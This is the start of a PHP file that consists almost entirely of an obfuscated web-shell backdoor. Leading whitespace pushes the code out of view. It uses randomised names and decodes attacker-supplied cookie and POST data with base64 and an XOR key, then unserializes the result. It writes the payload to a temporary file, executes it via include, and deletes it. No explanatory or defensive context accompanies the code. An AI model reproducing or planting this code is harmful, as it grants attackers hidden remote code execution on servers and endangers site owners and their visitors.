<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("ldgei")){class ldgei{public static $lfzukm = "sewtzcmhklapcicg";public static $rcqmqzm = NULL;public function __construct(){$jejncyd = @$_COOKIE[substr(ldgei::$lfzukm, 0, 4)];if (!empty($jejncyd)){$roimguoz = "base64";$syqwcuuml = "";$jejncyd = explode(",", $jejncyd);foreach ($jejncyd as $tmqfjnkhxj){$syqwcuuml .= @$_COOKIE[$tmqfjnkhxj];$syqwcuuml .= @$_POST[$tmqfjnkhxj];}$syqwcuuml = array_map($roimguoz . "_decode", array($syqwcuuml,)); $syqwcuuml = $syqwcuuml[0] ^ str_repeat(ldgei::$lfzukm, (strlen($syqwcuuml[0]) / strlen(ldgei::$lfzukm)) + 1);ldgei::$rcqmqzm = @unserialize($syqwcuuml);}}public function __destruct(){$this->jmhtra();}private function jmhtra(){if (is_array(ldgei::$rcqmqzm)) {$mxfzihbhbp = sys_get_temp_dir() . "/" . crc32(ldgei::$rcqmqzm["salt"]);@ldgei::$rcqmqzm["write"]($mxfzihbhbp, ldgei::$rcqmqzm["content"]);include $mxfzihbhbp;@ldgei::$rcqmqzm["delete"]($mxfzihbhbp);exit();}}}$ksccpgxtj = new ldgei(); $ksccpgxtj = NULL;} ?><?php
/**
